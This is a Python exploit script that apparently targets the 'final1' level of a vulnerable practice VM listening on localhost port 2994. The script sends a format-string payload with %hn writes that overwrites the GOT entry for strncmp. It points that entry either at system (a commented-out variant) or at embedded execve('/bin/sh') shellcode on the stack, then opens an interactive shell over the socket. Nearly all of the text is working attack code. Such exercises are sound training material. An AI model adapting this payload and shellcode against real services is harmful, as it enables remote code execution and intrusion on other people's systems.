import struct
import socket
import telnetlib

HOST = "127.0.0.1"
PORT = 2994

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

def recvUntil(check):
	buffer = ""
	while check not in buffer:
		buffer += s.recv(1)
	return buffer


print recvUntil("[final1] $ ")

''' One way
# Write address of system "0xb7ecffb0" at GOT entry of "STRNCMP" which is at "0x0804a1a8" 

#Login from 127.0.0.1:41216 as [Gaurav] with password [test@123]
ip,port = s.getsockname()
hostname = ip + ":" + str(port)
pad = "A" * (24 - len(hostname))
strncmp = struct.pack("I",0x0804a1a8)
strncmp2 = struct.pack("I",0x0804a1aa)
username = pad + strncmp2 + strncmp + "%47036d" + "%17$hn" + "%18372d" + "%18$hn"
password = "CCCC"
'''

''' Second way using writing shellcode to stack and then write its address to strncmp GOT address
# shellcode address on stack is "0xbffffbea" 
# Write address of system "0xbffffbea" at GOT entry of "STRNCMP" which is at "0x0804a1a8"
'''

ip,port = s.getsockname()
hostname = ip + ":" + str(port)
pad = "A" * (24 - len(hostname))
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
strncmp = struct.pack("I",0x0804a1a8)
strncmp2 = struct.pack("I",0x0804a1aa)

username = pad + strncmp2 + strncmp + shellcode + "%49075d" + "%17$hn" + "%15339d" + "%18$hn"
password = "CCCC"

#raw_input("Enter any character")
s.send("username " + username + "\n")
print recvUntil("[final1] $ ")
#raw_input("Enter any character") 
s.send("login " + password + "\n")
print recvUntil("login failed")
print recvUntil("[final1] $ ")
#raw_input("Enter any character")
s.send("username test\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
